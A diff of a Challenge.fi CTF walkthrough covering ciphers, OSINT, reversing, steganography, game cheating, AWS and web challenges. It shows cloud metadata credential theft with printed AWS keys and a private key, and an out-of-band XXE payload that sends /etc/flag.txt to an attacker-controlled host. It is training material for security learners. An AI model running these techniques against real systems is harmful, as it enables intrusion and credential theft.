@@ -1,49 +1,49 @@
 # Challenge.fi CTF Walkthrough
 - [Challenge.fi CTF Walkthrough](#challengefi-ctf-walkthrough)
 - [1. Good to know](#1-good-to-know)
-    - [1.1 Get Connected](#11-get-connected)
-    - [1.2 Rules](#12-rules)
+      - [1.1 Get Connected](#11-get-connected)
+      - [1.2 Rules](#12-rules)
 - [2. First steps](#2-first-steps)
-    - [2.1 Encoding Basics](#21-encoding-basics)
-    - [2.2 Basic Ciphers](#22-basic-ciphers)
-    - [2.3 I want to see more, see more and see more](#23-i-want-to-see-more-see-more-and-see-more)
+      - [2.1 Encoding Basics](#21-encoding-basics)
+      - [2.2 Basic Ciphers](#22-basic-ciphers)
+      - [2.3 I want to see more, see more and see more](#23-i-want-to-see-more-see-more-and-see-more)
 - [3. OSINT](#3-osint)
-    - [3.1 OSINT: GEOINT 1](#31-osint-geoint-1)
-    - [3.2 OSINT: GEOINT 2](#32-osint-geoint-2)
-    - [3.3 OSINT: Social Media 1](#33-osint-social-media-1)
-    - [3.4 OSINT: Social Media 2](#34-osint-social-media-2)
-    - [3.5 OSINT: Social Media 3](#35-osint-social-media-3)
-    - [3.6 OSINT: Social Media 4](#36-osint-social-media-4)
-    - [3.7 OSINT: Privacy policies](#37-osint-privacy-policies)
-    - [3.8 Where was this picture taken? 1/4](#38-where-was-this-picture-taken-14)
-    - [3.9 Where was this picture taken? 2/4](#39-where-was-this-picture-taken-24)
-    - [3.10 Where was this picture taken? 3/4](#310-where-was-this-picture-taken-34)
-    - [3.11 Where was this picture taken? 4/4](#311-where-was-this-picture-taken-44)
+      - [3.1 OSINT: GEOINT 1](#31-osint-geoint-1)
+      - [3.2 OSINT: GEOINT 2](#32-osint-geoint-2)
+      - [3.3 OSINT: Social Media 1](#33-osint-social-media-1)
+      - [3.4 OSINT: Social Media 2](#34-osint-social-media-2)
+      - [3.5 OSINT: Social Media 3](#35-osint-social-media-3)
+      - [3.6 OSINT: Social Media 4](#36-osint-social-media-4)
+      - [3.7 OSINT: Privacy policies](#37-osint-privacy-policies)
+      - [3.8 Where was this picture taken? 1/4](#38-where-was-this-picture-taken-14)
+      - [3.9 Where was this picture taken? 2/4](#39-where-was-this-picture-taken-24)
+      - [3.10 Where was this picture taken? 3/4](#310-where-was-this-picture-taken-34)
+      - [3.11 Where was this picture taken? 4/4](#311-where-was-this-picture-taken-44)
 - [4. Binary](#4-binary)
-    - [4.1 Enter the world of binary](#41-enter-the-world-of-binary)
-    - [4.2 Deep inside ones and zeros](#42-deep-inside-ones-and-zeros)
+      - [4.1 Enter the world of binary](#41-enter-the-world-of-binary)
+      - [4.2 Deep inside ones and zeros](#42-deep-inside-ones-and-zeros)
 - [5. Steganography](#5-steganography)
-    - [5.1 What's in this picture? 1/2](#51-whats-in-this-picture-12)
-    - [5.2 What's in this picture? 2/2](#52-whats-in-this-picture-22)
+      - [5.1 What's in this picture? 1/2](#51-whats-in-this-picture-12)
+      - [5.2 What's in this picture? 2/2](#52-whats-in-this-picture-22)
 - [6. Crypto](#6-crypto)
-    - [6.1 Catch the criminal 1](#61-catch-the-criminal-1)
-    - [6.2 Catch the criminal 2](#62-catch-the-criminal-2)
+      - [6.1 Catch the criminal 1](#61-catch-the-criminal-1)
+      - [6.2 Catch the criminal 2](#62-catch-the-criminal-2)
 - [7. Cheating](#7-cheating)
-    - [7.1 Project Kyyber 2021 part 1](#71-project-kyyber-2021-part-1)
-    - [7.2 Project Kyyber 2021 part 2](#72-project-kyyber-2021-part-2)
-    - [7.3 Project Kyyber 2021 part 3](#73-project-kyyber-2021-part-3)
+      - [7.1 Project Kyyber 2021 part 1](#71-project-kyyber-2021-part-1)
+      - [7.2 Project Kyyber 2021 part 2](#72-project-kyyber-2021-part-2)
+      - [7.3 Project Kyyber 2021 part 3](#73-project-kyyber-2021-part-3)
 - [8. Cloud](#8-cloud)
-    - [8.1 AWS Challenge 1](#81-aws-challenge-1)
-    - [8.2 AWS Challenge 2](#82-aws-challenge-2)
-    - [8.3 AWS Challenge 3](#83-aws-challenge-3)
-    - [8.4 AWS Challenge 4](#84-aws-challenge-4)
+      - [8.1 AWS Challenge 1](#81-aws-challenge-1)
+      - [8.2 AWS Challenge 2](#82-aws-challenge-2)
+      - [8.3 AWS Challenge 3](#83-aws-challenge-3)
+      - [8.4 AWS Challenge 4](#84-aws-challenge-4)
 - [9. Web](#9-web)
-    - [9.1 Cert checking](#91-cert-checking)
-    - [9.2 Hack weblogin part 1](#92-hack-weblogin-part-1)
-    - [9.3 Hack weblogin part 2](#93-hack-weblogin-part-2)
-    - [9.4 Hack MD](#94-hack-md)
-    - [9.5 Aapoweb](#95-aapoweb)
-    - [9.6 Securelogin](#96-securelogin)
+      - [9.1 Cert checking](#91-cert-checking)
+      - [9.2 Hack weblogin part 1](#92-hack-weblogin-part-1)
+      - [9.3 Hack weblogin part 2](#93-hack-weblogin-part-2)
+      - [9.4 Hack MD](#94-hack-md)
+      - [9.5 Aapoweb](#95-aapoweb)
+      - [9.6 Securelogin](#96-securelogin)
 
 # 1. Good to know
 #### 1.1 Get Connected
@@ -59,6 +59,8 @@ Our first challenge is to decrypt that string. We see the string is base64 encod
 
 `echo RkxBR3tMb29rc19yZWFsbHlfY3J5cHRpY19idXRfaXNfZWFzaWx5X3JldmVyc2VkfQ== | base64 -d`
 
+FLAG{Looks_really_cryptic_but_is_easily_reversed}
+
 #### 2.2 Basic Ciphers
 ```
 I was supposed to get this flag in the format FLAG{....}. Instead I got this:
@@ -67,9 +69,12 @@ What even is a synt?
 ```
 Here we have a classic caesar cipher ROT13 to be exact which changes alphabet order A becomes N and B becomes O etc.
 Lets pop that terminal open again and use this little script that rotates the alphabet from ROT13 to normal
-```
+```bash
  $ echo SYNT{jryy_guvf_jnf_rnfl} | tr '[a-m][n-z][A-M][N-Z]' '[n-z][a-m][N-Z][A-M]'
 ```
+FLAG{well_this_was_easy}
+
+
 #### 2.3 I want to see more, see more and see more
 Here we are given a [code.png](./basic-ciphers/code.png) picture which contains QR code. I chose to use [this](https://zxing.org/w/decode.jspx) website to decode the QR code from the image.
 Now we got something that looks like binary
@@ -82,11 +87,14 @@ Looking it at first makes you think its binary BUT what about the hints on the c
  3. Mor se?
 
 And now we can figure out it Morse code so let's change the 1's and 0's to dots and dashes.
-```
+```bash
 $ echo 1101 1011 10 001 000111 110010 0111 1 1 1001 110010 0111 000 000 1001 110010 0111 1 1 1001 110010 0111 1 1 1001 110010 0111 000 000 1001 110010 00 110 1011 0 11 1001 1011 1 110010 1011 10 0100 1 101 111 110010 000 01 110010 0 000 1001 110010 000 1101 110010 1 10 0101 1111 110010 000 0 1111 1 101 | sed -e 's/1/\./g' -e 's/0/\-/g'
 ..-. .-.. .- --. ---... ..--.- -... . . .--. ..--.- -... --- --- .--. ..--.- -... . . .--. ..--.- -... . . .--. ..--.- -... --- --- .--. ..--.- -- ..- .-.. - .. .--. .-.. . ..--.- .-.. .- -.-- . .-. ... ..--.- --- -. ..--.- - --- .--. ..--.- --- ..-. ..--.- . .- -.-. .... ..--.- --- - .... . .-.
 ```
 Now we need to change that Morse code into something we can read so we fireup [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')) and we load our morse code in there and vóila we got a flag.
+
+FLAG:_BEEP_BOOP_BEEP_BEEP_BOOP_MULTIPLE_LAYERS_ON_TOP_OF_EACH_OTHER
+
 # 3. OSINT
 #### 3.1 OSINT: GEOINT 1
 ```
@@ -203,12 +211,12 @@ Let's do the same again, download the [picture](./OSINT/d.jpg) and load it in th
 Are you able to find something interesting inside this compilation?
 ```
 Let's download our [file](./binary/level1.out) and run `file level1.out` 
-```
+```bash
 $ file level1.out
 level1.out: Mach-O 64-bit x86_64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>
 ```
 Oh noes, it's a Mach-O executable file and I'm running Kali Linux which doesnt support running these files. Quick google search and we found ourselves a program called [maloader](https://github.com/shinh/maloader) this way we can run these pesky Mach-O executables. So lets run `ld-mac level1.out`
-```
+```bash
 $ ./ld-mac level1.out
 Thou shall not pass?
  password
@@ -216,7 +224,7 @@ Thy password: password
 Thou fool! That is not the answer. Contemplate this on the tree of woe.
 ```
 Seems like we need a correct password. Let's try runnning strings on the executable. `-n 7 for lines longer than 7 characters`
-```
+```bash
 $ strings -n 7 level1.out |less
     ....
     Kissa123
@@ -228,7 +236,7 @@ $ strings -n 7 level1.out |less
     ....
 ```
 Kissa123 seems interesting. It's probably the password and the line below it must be the flag encoded with the key Kissa123. Lets try it out!
-```
+```bash
 Thou shall not pass?
  Kissa123
 Thy password: Kissa123
@@ -240,7 +248,7 @@ FLAG{ROTWasHere2021}
 Ok, the first binary challenge was trivial. This may not be...
 ```
 Let's download our [file](./binary/level2.out) and run strings again
-```
+```bash
 $ strings -n 7 level2.out |less
 ....
 ThknsfUrkbt
@@ -254,14 +262,14 @@ Thou fool! Thy must learn thy lessons better! Bits have not been manipulated cor
 ```
 
 Same thing as last time it seems. Lets run the executable and use `ThknsfUrkbt` as password.
-```
+```bash
 $ ./ld-mac level2.out
 Thou shall not pass?
  ThknsfUrkbt
 Thy password: ThknsfUrkbt
 ```
 Well thats odd, lets try some other password like `Kissa123` on this one.
-```
+```bash
 Thou shall not pass?
  Kissa123
 Thy password: Kissa123
@@ -274,7 +282,7 @@ As you can see from the above picture the `cmp rax, 0xb` instruction checks if t
 ![reverse_the_jump](./binary/reverse_jump.png)
 
 Now lets run the executable again and enter the password from before.
-```
+```bash
 $ ld-mac level2.out
 Thou shall not pass?
  ThknsfUrkbt
@@ -300,7 +308,7 @@ This picture is more than meets the eye...
 Can you extract information from this picture and find a famous landmark hidden in it?
 ```
 Let's download the picture [again](./steganography/c.jpg) and load it on my favorite [online exiftool](http://exif.regex.info/exif.cgi). Thumbnail picture is from a HP Laptop, I bet that's not the famous landmark, lets dig deeper. Lets use strings to findout if there's some other pictures inside it.
-```
+```bash
 $ strings -n 3 -t x c.jpg |grep "JFIF\|PNG"
       6 JFIF
     48e JFIF
@@ -308,7 +316,7 @@ $ strings -n 3 -t x c.jpg |grep "JFIF\|PNG"
  1c9ff4 PNG
 ```
 This tells us there is at least a second picture in there in `.png` format. Lets try to dig this out with binwalk
-```
+```bash
 $ binwalk -Me c.jpg
 Scan Time:     2021-03-30 15:14:56
 Target File:   /home/kali/Downloads/c.jpg
@@ -347,7 +355,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 ```
 
 Looks like we got something! Let's go see:
-```
+```bash
 $ ls -la
 drwxrwxrwx root root   512 B  Tue Mar 30 15:14:57 2021  .
 drwxrwxrwx root root   512 B  Tue Mar 30 15:14:57 2021  ..
@@ -363,8 +371,8 @@ first file: `1CA048: Microsoft color profile 2.1, type Lino, RGB/XYZ-mntr device
 second file:`1CAAB8: Tower/XP rel 2 object not stripped`
 
 This doesn't tell us much, maybe we're off the tracks here. Let's try some different program to extract data with like [foremost](https://github.com/jonstewart/foremost.git)
-```
-foremost -i c.jpg -o foremost/c.jpg/ -v
+```bash
+$ foremost -i c.jpg -o foremost/c.jpg/ -v
 Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
 Audit File
 
@@ -419,7 +427,7 @@ Let's break this down on `line 18` it checks that we use 3 arguments if we dont 
 `line 38` the code uses fseek function to read as bytes from the 0 byte to the end of the file. If the file is empty it gives us error message.
 `line 48: mask = (0xa5a5a5a5) ^ (0x5a5a5a5a);` As the code says Evil Magic trix `^` is used as XOR operator in C. That should tell use from previous experience that we need to reverse the action the code does. Lets dive deeper.
 `line 52` if clause checks the file length in bytes and if the file length is less than 2 bytes it runs the code below it. But in our case our file is bigger than 2 bytes so our encryption starts a bit lower at `line 66` for loop goes over the file and reads 2 bytes then swaps the bytes and bitmagics them. So we need to reverse the operation between lines 72-74 like so:
-```
+```c
 Original
 72: tmp = (dbuf[0] ^ 0xa5) & mask;
 73: dbuf[0] = ~(dbuf[1] & mask);
@@ -431,7 +439,7 @@ Reversed:
 74: dbuf[0] = ~tmp;
 ```
 Lets save the file as decode.c and compile it `gcc -o decode decode.c` and run the new program.
-```
+```bash
 $ ./decode encrypted_data decrypted_data
 
 Lets run file command for it and see what we get
@@ -470,13 +478,13 @@ The program asks you to provide the necessary information to decrypt the encrypt
 The task is to find out how the program encrypts the contents of a given file and finally decrypts the encrypted file “encrypted_data”.
 ```
 Let's start off by creating a file with something simple inside it lets do a `echo "hello world" > plain_text` and the encode it using `./encode plain_text plain_text.encrypted` and lets run `cat plain_text.encrypted`
-```
+```bash
 $ cat plain_text.encrypted
 �0����
 ```
 So we get this weird gibberish lets try to decrypt this using the decode program.
 `./decode plain_text.encrypted plain_text.decrypted`
-```
+```bash
 $ ./decode plain_text.encrypted plain_text.decrypted
 Enter length of the encryption key (1-1024):
 1
@@ -676,8 +684,8 @@ Lets check the first hint:
 Okay that tells us something, lets fire up the game. Start by running `python3 server.py` followed by `python3 client.py`
 ![first_start](./cheating/first_start.png)
 
-We can see our Ammo, Reload and HP in there. Hint said the first achievement is called "PEW PEW" so it must have something to do with the Ammo. Lets try shooting. We spend our 4 ammo and we begin to reload. So I think we must figure out how to shoot more than 4 times. Lets take a look at the `client.py` file. We scroll down to the bottom of the file and find our "shoot" function on lines 129-138
-```
+We can see our Ammo, Reload and HP in there. Hint said the first achievement is called "PEW PEW" so it must have something to do with the Shooting/Ammo. Lets try shooting. We spend our 4 ammo and we begin to reload. So I think we must figure out how to shoot more than 4 times. Lets take a look at the `client.py` file. We scroll down to the bottom of the file and find our "shoot" function on lines 129-138
+```py
 Line 129:                    if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
 Line 130:                        if me.ammo > 0:
 Line 131:                            sendevent.append(
@@ -690,7 +698,7 @@ Line 137:                                ]
 Line 138:                            )
 ```
 Looking at the if clause `if me.ammo > 0:` if me(player).ammo is more than 0 sendevent "shoot" clearly we can exploit this and remove the whole if clause.
-```
+```py
 Line: 129                    if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
 Line: 130                        sendevent.append(
 Line: 131                            [
@@ -712,7 +720,7 @@ Lets see the hint:
  1. Achievement for part 2 is called "NO ROOF!"
 
 No roof, what on earth does that mean? There's more functions under the shooting function in the `client.py` file lets see what we have
-```
+```py
                 keys = pygame.key.get_pressed()
                 if keys[pygame.K_SPACE] and not me.state == "jumping":
                     sendevent.append(["jump"])
@@ -725,21 +733,21 @@ No roof, what on earth does that mean? There's more functions under the shooting
 ```
 So we can move left and right with A and D and we can jump with Space. Lets try those. Done trying?
 As you can see the jumping isnt very high I think the NO ROOF achievement is related to that. Maybe we need to find a way to jump over the top of the screen. Lets have a look at the jumping function. Lets open up `common.py` from the gamelogic folder in our editor and look for `"jump"`
-```
+```py
                 if event.name == "jump":
                     if player.state != "jumping":
                         player.state = "jumping"
                         player.y_vel += 4
 ```
 If our client sends event called jump and if our player state is not jumping, change it to jumping and add 4 to player y velocity. Okay now we understand why we can't jump more than once since our state is "jumping" when we jump. How can we change our state to something else to allow us to jump again during our initial jump. Look at lines 100-102
-```
+```py
                 elif event.name == "reload":
                     player.state = "reloading"
                     player.reloadleft = 150
 ```
 The reload function resets the player state to reloading so our state wouldn't be jumping anymore. Let's try it out!
 Back in the `client.py` change we add a new sendevent in our jump function like so
-```
+```py
                 if keys[pygame.K_SPACE] and not me.state == "jumping":
                     sendevent.append(["jump"])
                     sendevent.append(["reload"])
@@ -761,7 +769,7 @@ Boss was found and when we landed we got killed pretty much instantly. Hmmmm, ho
 Well first off we might want to shoot automatically so we dont need to click all the time. Lets do that first.
 
 We copy lines lines 130-137 to under `if me: on line 123`. We do this because `if me: ` doesnt have any type of event checks unlike the original position. Now it just shoots if player exists.
-```
+```py
 Original:
             if me:
                 if me.state == "normal" and not me.reloadleft and not me.ammo > 0:
@@ -807,7 +815,7 @@ Modified:
                 keys = pygame.key.get_pressed()
 ```
 Next we want to reset our state everytime we move so we add reload event to our movement keys.
-```
+```py
 Original:
                 if keys[pygame.K_a] and not me.dir == 1:
                     sendevent.append(["left"])
@@ -824,12 +832,12 @@ Modified:
 ```
 Now we're reloading constantly. Now we need to figure out how to get rid off all those enemies. We can use multiple clients to connect to the server but how do we move them all at the same time?
 Lets copy `client.py` to `botclient.py`. First lets make a little addition to our `client.py` by printing out our `client.py` player_id. Add the following line to `line 118` in `client.py`
-```
+```py
 117:        my_id = json.loads(data)["player_id"]
 118:        print('ME: %d' % (my_id))
 ```
 Now let us open `botclient.py` and do some changes. Lets import sys so we can use our player_id as argument when we start the bot client
-```
+```py
 Line 9:import sys
 
 Line 118:        my_id = json.loads(data)["player_id"]
@@ -843,7 +851,7 @@ Line 125:                elif player.id == master_id:
 Line 126:                    master = player
 ```
 Now our bot recognizes our `client.py` as master, next lets make our bots move according to masters movement.
-```
+```py
 Line 128:                if master.x > me.x:
 Line 129:                    sendevent.append(["right"])
 Line 130:                elif master.x < me.x:
@@ -863,7 +871,7 @@ Our hint is:
 
 Looks like we need to install docker on our kali linux so lets do exactly that here's the [link](https://linuxhint.com/install_docker_kali_linux/) for installing Docker on Kali linux. Once that is done lets dive into the challenge.
 First lets pull our docker image with `docker pull challengeapp/myapp`
-```
+```bash
 $ docker pull challengeapp/myapp
 Using default tag: latest
 Trying to pull repository docker.io/challengeapp/myapp ...
@@ -886,7 +894,7 @@ Status: Downloaded newer image for docker.io/challengeapp/myapp:latest
 ```
 Now lets see whats in the history of the image by running:
 `docker history $(docker images |grep -v REPO |awk 'NR==1 {print $3}') --format="table{{.CreatedBy}}" --no-trunc`
-```
+```bash
 $ docker history $(docker images |grep -v REPO |awk 'NR==1 {print $3}') --format="table{{.CreatedBy}}" --no-trunc
 CREATED BY
 /bin/sh -c #(nop)  CMD ["waitress-serve" "--call" "app:create_app"]
@@ -920,14 +928,14 @@ CREATED BY
 /bin/sh -c #(nop) ADD file:ec475c2abb2d46435286b5ae5efacf5b50b1a9e3b6293b69db3c0172b5b9658b in /
 ```
 We can see that there's a ssh-key in `/root/.ssh/id_ed25519`, our use is `joe` and our workdirectory/landing directory is `/opt` and that there's an `app` directory inside. Not much info but that's something. Lets dive into the container itself. Lets run `docker run -d -p 8080:8080 $(docker images |grep -v REPO |awk 'NR==1 {print $3}')` to start the container and then lets run `docker exec -it $(docker ps |grep -v CONT |awk '{print $1}') /bin/bash` so we can get inside the container.
-```
+```bash
 $ docker run -d -p 8080:8080 $(docker images |grep -v REPO |awk 'NR==1 {print $3}')
 2dc9df5d51685c16b2442601e058acfda192092270ef201f58535e657acb59d1
 $ docker exec -it $(docker ps |grep -v CONT |awk '{print $1}') /bin/bash
 bash-5.0$
 ```
 Next up is to check what we have in our workdirectory `ls -la` always comes handy.
-```
+```bash
 bash-5.0$ ls -la
 total 20
 drwxr-xr-x    1 root     root          4096 Feb  3 21:13 .
@@ -974,7 +982,7 @@ Still remember our hint for the challenge? Thats a S3 Bucket address. Lets take 
 ![s3bucket_response](./cloud/s3bucket.png)
 
 Looks like we found ourselves a flag!
-```
+```bash
 $ curl https://frk-bucket-challenge-1234.s3.amazonaws.com/settings/stuff/flag.txt
 FLAG{jAnu6QLYjcmotXMUCmxfjW1Td3z6HD74EMTPuYHvdjtY3Dfyy8TUF7NFatasb1}
 ```
@@ -999,17 +1007,17 @@ GvS3ZQXEZN7KUyzT3dHNAAAAEnNlY3JldEBleGFtcGxlLmNvbQECAw==
 -----END OPENSSH PRIVATE KEY-----
 ```
 We got ourselves a privatekey, lets save it into `aws2-ec2-instance.pem` and run `chmod 600 aws2-ec2-instance.pem` now we just need to find the EC2 machine where to login. Lets check that [s3bucket-url](https://frk-bucket-challenge-1234.s3.amazonaws.com/) again. There's still `settings/stuff/settings.cfg` which we haven't looked up yet. Let's do a curl on that.
-```
+```bash
 $ curl https://frk-bucket-challenge-1234.s3.amazonaws.com/settings/stuff/settings.cfg
 176.34.164.26
 ```
 Let's run host command just to see if it points to Amazon EC2
-```
+```bash
 $ host 176.34.164.26
 26.164.34.176.in-addr.arpa domain name pointer ec2-176-34-164-26.eu-west-1.compute.amazonaws.com.
 ```
 Very well, lets try to ssh into the instance.
-```
+```bash
 $ ssh -l root -i id_ed25519 176.34.164.26
 The authenticity of host '176.34.164.26 (176.34.164.26)' can't be established.
 ECDSA key fingerprint is SHA256:OdrvASoMHwJRyrMVkJJZp0dh4XQEIAnZnsFi4oPr8SA.
@@ -1018,7 +1026,7 @@ Warning: Permanently added '176.34.164.26' (ECDSA) to the list of known hosts.
 root@176.34.164.26's password: 
 ```
 Blast! We dont have the password for root, maybe the key is for some other user. Lets try joe from the container.
-```
+```bash
 $ ssh -l joe -i id_ed25519 176.34.164.26
   ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ██▓ ▒█████   ███▄    █    ▒███████▒   
  ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █    ▒ ▒ ▒ ▄▀░   
@@ -1045,7 +1053,7 @@ $ ssh -l joe -i id_ed25519 176.34.164.26
 $ 
 ```
 We're in! Now lets do some scouting.
-```
+```bash
 $ ls -la
 total 344
 drwxr-xr-x  2 1001 1002   4096 Mar 22 23:16 .
@@ -1068,14 +1076,14 @@ Hints:
  3. Sometimes developers may expose sensitive data in the user-data field of the EC2 metadata when spinning up new instance.
 ```
 So we need to exfiltrate user-data from AWS meta-data service. After some googling I found [this](https://hackingthe.cloud/aws/general-knowledge/introduction_user_data/). So lets go ahead and try that with our ec2 instance.
-```
+```bash
 $ curl http://169.254.169.254/latest/user-data/
 #!/bin/bash
 echo 'Password for Liisa: moiasdf231vasd1' > /tmp/pass.txt
 rm /tmp/pass.txt
 ```
 Well well well look at that we got ourselves a password. Lets login with user `liisa`.
-```
+```bash
 $ ssh -l liisa 176.34.164.26
 liisa@176.34.164.26's password:
   ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ██▓ ▒█████   ███▄    █    ▒███████▒
@@ -1103,7 +1111,7 @@ liisa@176.34.164.26's password:
 $
 ```
 And we're in! Again lets do some scouting.
-```
+```bash
 $ ls -la
 total 24
 drwxr-xr-x 2 1002 1003 4096 Mar 10 14:53 .
@@ -1135,51 +1143,7 @@ tail test
 tail test
 tail test
 tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
+....
 tail test
 tail test
 tail test
@@ -1192,24 +1156,7 @@ tail test
 tail test
 tail test
 tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
+....
 tail test
 touch Test1
 touch Test3
@@ -1226,7 +1173,7 @@ Hints:
  3. You need to combine a bunch of information you have gathered by now to query the aws environment.
 ```
 Looks like we need to dig out more stuff from the meta-data service.
-```
+```bash
 $ curl http://169.254.169.254/latest/meta-data
 ami-id
 ami-launch-index
@@ -1260,7 +1207,7 @@ AMI = Amazon Machine Images ---- not what we're looking for
 IAM = Identity and Access Management  ---- sounds a bit more interesting
 
 Lets take a dive into iam
-```
+```bash
 $ curl http://169.254.169.254/latest/meta-data/iam/
 info
 security-credentials/
@@ -1277,13 +1224,13 @@ $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/FraktalS
   "Expiration" : "2021-04-01T03:27:11Z"
 ```
 This is huge, we can actually use these credentials for `aws cli`. If you don't have it installed you can install it using `sudo apt -y install awscli`. Now we need to use those credentials for our `aws cli` we can export them as environment variables like so:
-```
+```bash
 export AWS_ACCESS_KEY_ID="ASIAQROOHKZA2FR3D5ZO"
 export AWS_SECRET_ACCESS_KEY="vJjvs3DblAaC1doXEewUcw5zixkU8vy5NAIIw9zQ"
 export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEE4aCWV1LXdlc3QtMSJIMEYCIQD/aatnbBXGQ5Ue4e57kioA98NqKK/9/4TvHLO43vD+hgIhAK+hj77DIesFtY4YDuG7CKRXBqIK0s1ccWjDM+mM9zZpKr0DCJb//////////wEQABoMMDM3NDc2NTg3MDczIgx/4RUdAuRTqv4Ky5sqkQNMTIJxAOoSYMAFxBop00zdNnCPDGyYCqCczE70mJE5L4QzYzTNa/4V2xMk2C+YicuoISagg1Cb6DqXz2nmNmtK5D1pIN29CoskFTJm1PeQvuk7Lny1Tu0d59/M8Pn1ruMZW9G5w5lutLC6irSTCzg1S8j1sBaZPwHUEp0RbP9HlQse7Nimpp0L3xGxm32vBxVviUo5JIuX9HMzaBpD/je9uEoxTPXdOKOJqdAt+msv5O0/EYGoKmhpIMV1/rDApXSXV09FG7kdZqOpJeYbgXs2ajmh2tP7jUi1wvr3qHQTmBFz2xczSipc2k2Ar8TSkvKubUedee071G1A8N0VZyWrpUgzL/c8GYHwKHZ+cN+PpjBmITms/M+phdtE2jMuq0/UUKOPWg432k1Erfhm8v+uMw64dxTCAGmEy6s/REikNkiRqKRhcbimrmaDbPQagSj9NKoHecu5zUB7y+Xg8LrXOepNH8Ifyi5ez8syVXVgER04HQAwKofBnqskGpqokt/vLFM8tM1JNYie/lfHFzmenTCLy5ODBjrqAZQpB29/n6bozhFzA73VumCDDfTEL78j29Qu7eMdVnJg8mDR9Lzngq02SEkTBkOlhvz2i0gMS0kAVReHFVE7KM7EbIiEOICjf9iT8mOUQz6KUjehBit0raZjQ/FG3TfktbTt2bE1jb2O2wV3HrCGzRYr+L46dmNAxfFzbx+erZO4UG1rD5HzYot8YjG2IV9pIyZSie7TUL4yPHlnOaAm4u9nxZ+20oiT1fnNmR2yAgIN+WL4i6vg0BE9RRZSHprdxaWJMUDmjdz1PZrjfQhReiCYRcuoF9Nr2Zc0xq1uPchji1Sr+2WxHUGf5w=="
 ```
 Now we can use `aws cli` as FraktalSecretsManager user. Funnily enough our very first hint also comes in handy. There's an aws service called `Secrets Manager` so we run `aws secretsmanager --help`
-```
+```bash
 $ aws secretsmanager help
 AVAILABLE COMMANDS
        o cancel-rotate-secret
@@ -1308,7 +1255,7 @@ AVAILABLE COMMANDS
        o validate-resource-policy
 ```
 Lets try `list-secrets`
-```
+```bash
 $ aws secretsmanager list-secrets
 You must specify a region. You can also configure your region by running "aws configure".
 
@@ -1333,7 +1280,7 @@ $ aws secretsmanager list-secrets --region=eu-west-1
 }
 ```
 Okay so there is a secret, now can use `aws secretsmanager get-secret-value --secret-id=fisc-chall-secret --region=eu-west-1`
-```
+```bash
 # aws secretsmanager get-secret-value --secret-id=fisc-chall-secret --region=eu-west-1
 {
     "ARN": "arn:aws:secretsmanager:eu-west-1:037476587073:secret:fisc-chall-secret-41VJbh",
@@ -1553,7 +1500,7 @@ Lets break down the command.
 `-newkey rsa:2048` pretty self-explanatory creates a 2048bit RSA key
 `-keyout` outfile for our privatekey
 `-out` outfile for our certificate
-```
+```bash
 $ openssl req -x509 -nodes -newkey rsa:2048 -keyout aapoweb.key -out aapoweb.crt
 Generating a RSA private key
 ...............................................+++++
@@ -1686,14 +1633,14 @@ Alright! We got something, looks like the site has xml.php with xml parameter. T
 ![decoded](./web/decoded.png)
 
 Alright so we're dealing with actual XML and I figured we're most likely going to do some sort of XXE attack (XML External Entity) here. So I start googling about XXE attacks and I tried a few (read: A LOT) different ways but I never seemed to get any other response from the server than `Username or password not found! Try Harder!`. Then after a while of banging my head against the table I stumbled upon [THIS](https://medium.com/@jonathanbouman/xxe-at-bol-com-7d331186de54) a brilliant bugbounty write up by Jonathan Bouman. He was using [xxeserv](https://github.com/staaldraad/xxeserv) along with external DTD file on a public facing server. So that's exactly what I did. I installed xxeserv and copied his sp2.dtd
-```
+```html
 <!ENTITY % d SYSTEM "file:///etc/flag.txt">
-<!ENTITY % c "<!ENTITY body SYSTEM 'ftp://x.x.x.x:21/%d;'>">
+<!ENTITY % c "<!ENTITY body SYSTEM 'ftp://<IP>:21/%d;'>">
 ```
 and his payload
-```
+```html
 <!DOCTYPE creds [
-<!ENTITY % a SYSTEM "http://x.x.x.x:80/dtds/sp2.dtd">
+<!ENTITY % a SYSTEM "http://<IP>:80/dtds/sp2.dtd">
 %a;
 %c;
 ]>
@@ -1703,7 +1650,7 @@ and his payload
 </creds>
 ```
 And I used curl to make the request
-```
+```bash
 curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Connection: close" --data "xml=PCFET0NUWVBFIGNyZWRzIFsgPCFFTlRJVFkgJSBhIFNZU1RFTSAiaHR0cDovLzE5NS4xNDguMjIuODI6ODAvc3AyLmR0ZCI%2BJWE7JWM7XT4KPGNyZWRzPgogICAgPHVzZXI%2BJmJvZHk7PC91c2VyPgogICAgPHBhc3M%2BcGFzc3dvcmQ8L3Bhc3M%2BCjwvY3JlZHM%2B" http://securelogin.challenge.fi:8880/xml.php
 <html><body><h1>400 Bad request</h1>
 Your browser sent an InVaLiD rEqUEsT.
@@ -1712,30 +1659,30 @@ Your browser sent an InVaLiD rEqUEsT.
 FINALLY after I don't know how many hours I got some other answer from the server than "Try harder!"
 Lets get back to the payload and the external DTD.
 The servers XML parser goes through our payload `line by line`
-```
+```html
 <!DOCTYPE creds [
-<!ENTITY % a SYSTEM "http://x.x.x.x:80/dtds/sp2.dtd">
